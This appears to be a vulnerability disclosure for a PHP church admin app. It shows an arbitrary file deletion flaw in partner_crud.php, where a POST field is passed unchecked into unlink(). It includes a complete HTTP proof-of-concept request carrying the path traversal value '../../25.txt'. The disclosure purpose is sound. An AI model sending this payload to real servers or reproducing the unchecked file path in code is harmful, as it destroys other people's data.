### Vulnerability file address

In line 49 of `church/admin/app/partner_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photo_img']);`,` $_POST['old_photo_img']` parameters have not been restricted, which causes any file to be deleted

```php
if (isset($_POST['update'])) {
		if (!empty($_FILES['photo']['tmp_name'])) {
			$file_extension = pathinfo($_FILES["photo"]["name"], PATHINFO_EXTENSION);
			$new_filename = uniqid() . '.' . $file_extension;
			$filepath = "../../assets/images/" . $new_filename;

			if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
				$img1 = $new_filename;
				@unlink("../../assets/images/" . htmlspecialchars($_POST['old_photo_img']));
			}
		}
```

### POC

```http
POST /church/admin/app/partner_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 371

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo_img"

../../25.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `25.txt` file in the `church/` directory

![image-20250505171052052](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051710101.png)



Then we execute the above poc to attack

![image-20250505173414752](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051734786.png)



Files are deleted after the attack is successful

![image-20250505173448079](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051734121.png)